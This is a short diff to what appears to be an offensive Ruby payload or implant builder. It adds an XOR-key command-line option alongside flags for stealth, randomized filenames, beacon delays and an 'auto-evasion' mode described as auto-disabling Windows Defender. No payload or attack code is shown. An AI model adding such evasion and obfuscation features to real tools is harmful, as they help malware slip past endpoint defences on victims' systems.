@@ -27,7 +27,7 @@ require 'set'
 
 Signal.trap('INT') { puts "\n[!] Ctrl-C detected, exiting cleanly..."; exit }
 
-# Compatibility shim – define Fixnum for Ruby 3.x - no longer needed
+# Compatibility shim – define Fixnum for Ruby 3.x
 #class Fixnum < Integer; end unless defined?(Fixnum)
 
 # Root namespace
@@ -113,6 +113,10 @@ OptionParser.new do |opts|
     options[:stealth] = true
     options[:random_names] = true
   end
+  opts.on('--xor-key KEY', 'XOR encryption key (hex or decimal)') do |v|                                                                                                                                                 
+    options[:xor_key] = v.to_i(16) if v.start_with?('0x')                                                                                                                                                                
+    options[:xor_key] = v.to_i unless v.start_with?('0x')                                                                                                                                                                
+  end  
   opts.on('--random-names', 'Randomize filenames')                 { options[:random_names] = true }
   opts.on('--auto-evasion', 'Auto-disable Defender')               { options[:auto_evasion] = true }
   opts.on('--beacon', 'Add sleep delay between commands')          { options[:beacon] = true }
